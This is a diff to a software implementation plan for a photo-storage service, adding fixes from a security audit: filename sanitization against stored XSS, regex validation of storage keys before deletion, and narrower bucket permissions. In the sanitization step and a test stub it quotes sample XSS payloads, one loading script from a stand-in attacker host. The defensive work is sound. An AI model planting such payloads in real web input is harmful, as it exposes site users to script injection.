@@ -16,6 +16,15 @@
 
 ## Changelog
 
+### v7.0 — 2026-03-05
+Revised following third security audit (`docs/plans/2026-03-05-saas-conversion-phase-3-security-audit-3.md`). Two of three findings addressed; SA3-F3 was already resolved in v6.0 as MI-6.
+
+| ID | Change |
+|----|--------|
+| SA3-F1 | `original_filename` sanitized with null-safe `Jsoup.parse(s).text()` before DB write; `upload_sanitizesOriginalFilenameForDisplay()` test stub added; Phase 4 rendering note added to Task 3.2 |
+| SA3-F2 | `DeleteJobConsumer` validates all three storage keys against `STORAGE_KEY_PATTERN` regex after null/blank guard; worker MinIO IAM policy tightened to `originals/*` and `thumbnails/*` sub-prefixes; test stub added |
+| SA3-F3 | Already resolved in v6.0 (MI-6): `Files.deleteIfExists()` + logged IOException in ExifTool finally block |
+
 ### v6.0 — 2026-03-05
 Revised following sixth critical implementation review (`docs/plans/2026-02-25-saas-conversion-phase-3-critical-review-6.md`). All four critical issues and seven minor issues addressed. Critical review 3 issues re-verified as correctly fixed in v4.0.
 
@@ -134,10 +143,15 @@ Create a `worker-policy.json`:
   "Statement": [{
     "Effect": "Allow",
     "Action": ["s3:GetObject", "s3:PutObject", "s3:DeleteObject"],
-    "Resource": "arn:aws:s3:::jpt-photos/*"
+    "Resource": [
+      "arn:aws:s3:::jpt-photos/*/originals/*",
+      "arn:aws:s3:::jpt-photos/*/thumbnails/*"
+    ]
   }]
 }
 ```
+
+**Why sub-prefix scoping (SA3-F2):** Restricting to `originals/*` and `thumbnails/*` means even a fully compromised worker credential cannot delete arbitrary bucket contents (e.g., other tenants' top-level objects or infrastructure backups). This limits the blast radius of a Redis-compromise or container-escape scenario at the IAM level — independent of application-level validation.
 
 Provision via `mc`:
 ```bash
@@ -318,6 +332,12 @@ void upload_computesSha256AndUploadsToMinioFromTempFile() {
     // assert multipartFile.getInputStream() is called exactly once;
     // assert MinIO receives correct file content via temp file path (not original stream)
 }
+
+@Test
+void upload_sanitizesOriginalFilenameForDisplay() {
+    // assert that a filename containing "<script>alert(1)</script>.jpg" is stripped to
+    // "alert(1).jpg" (or similar plain text) before being written to photos.original_filename
+}
 ```
 
 **Step 4: Implement upload endpoint**
@@ -362,7 +382,14 @@ void upload_computesSha256AndUploadsToMinioFromTempFile() {
   ```
   If the MIME type has no mapping, reject with `415 Unsupported Media Type` before any MinIO upload or DB write.
 
-  The user-supplied filename extension is **never** used in `storage_key` or any file I/O path. If the original filename must be preserved for user display, store it in a separate `original_filename` column (display-only).
+  The user-supplied filename extension is **never** used in `storage_key` or any file I/O path. If the original filename must be preserved for user display, store it in a separate `original_filename` column (display-only). **Sanitize before storing (SA3-F1):** `multipartFile.getOriginalFilename()` is a raw HTTP multipart header value — entirely user-controlled. Apply the same `Jsoup.parse(s).text()` pattern used for EXIF fields:
+  ```java
+  String rawFilename = multipartFile.getOriginalFilename();
+  String safeOriginalFilename = rawFilename != null ? Jsoup.parse(rawFilename).text() : null;
+  ```
+  Store `safeOriginalFilename`, never `rawFilename`. Without this, a filename like `"><script src=//attacker.com/x.js></script>.jpg` is written verbatim to the DB and becomes a stored XSS payload when Phase 4 renders it.
+
+  **Phase 4 note:** `original_filename` is user-supplied and must be rendered via React text nodes only (`{photo.originalFilename}`); never via `dangerouslySetInnerHTML` or as an unescaped HTML attribute. See Phase 4 Task 4.6 for the safe EXIF rendering requirement — the same constraint applies here.
 
   **Rationale:** User-supplied extensions are unconstrained and user-controlled. Tika magic-byte detection is system-controlled, validated, and produces a known-good extension. This eliminates an entire class of input-confusion attacks on storage keys and temp file paths.
 
@@ -550,6 +577,12 @@ void photoJobConsumer_xacksAndSkipsMessageWithNullStorageKey() {
     // assert XACK is called and no MinIO download is attempted when storage_key is null
     // (photo stuck between Tx 1 and Tx 2 of upload; TrashPurgeScheduler will clean up)
 }
+
+@Test
+void deleteJobConsumer_rejectsMessageWithInvalidStorageKeyFormat() {
+    // assert XACK is called and no MinIO delete is attempted when originalKey is non-blank
+    // but does not match STORAGE_KEY_PATTERN (e.g., "admin/backup/db-dump.sql")
+}
 ```
 
 **Step 2: Implement PhotoJobConsumer**
@@ -596,6 +629,31 @@ void photoJobConsumer_xacksAndSkipsMessageWithNullStorageKey() {
   }
   ```
   This prevents a cascading retry storm and dead-letter buildup if a malformed message enters the stream by any path.
+- **Storage key format validation (SA3-F2):** After the null/blank guard, validate that all three keys match the expected UUID-based format before any MinIO call. A key that passes the null/blank check but has an unexpected structure (e.g., from a Redis-compromise injection) must not reach the MinIO client:
+  ```java
+  private static final Pattern STORAGE_KEY_PATTERN = Pattern.compile(
+      "^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" +
+      "/(originals|thumbnails)/" +
+      "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}(_sm|_md)?\\.[a-z0-9]+$");
+
+  private boolean isValidStorageKey(String key) {
+      return key != null && STORAGE_KEY_PATTERN.matcher(key).matches();
+  }
+  ```
+  Apply before each MinIO delete call. For `original_key`, reject and XACK if invalid. For `thumbnail_sm` and `thumbnail_md`, skip the individual MinIO call (they may be legitimately absent for photos that never completed thumbnail generation) but log at WARN:
+  ```java
+  if (!isValidStorageKey(originalKey)) {
+      log.error("delete-job originalKey failed format validation — XACK and skip, " +
+                "key={}, photo_id={}", originalKey, photoId);
+      redisCommands.xack(DELETE_JOBS_STREAM, CONSUMER_GROUP, messageId);
+      return;
+  }
+  // For thumbnails: skip individual key if format invalid; original already validated
+  if (isValidStorageKey(thumbnailSm)) { /* delete thumbnailSm */ }
+  else { log.warn("thumbnail_sm key invalid format — skipping, photo_id={}", photoId); }
+  if (isValidStorageKey(thumbnailMd)) { /* delete thumbnailMd */ }
+  else { log.warn("thumbnail_md key invalid format — skipping, photo_id={}", photoId); }
+  ```
 - Delete all three MinIO keys per message
 - `XACK`
 
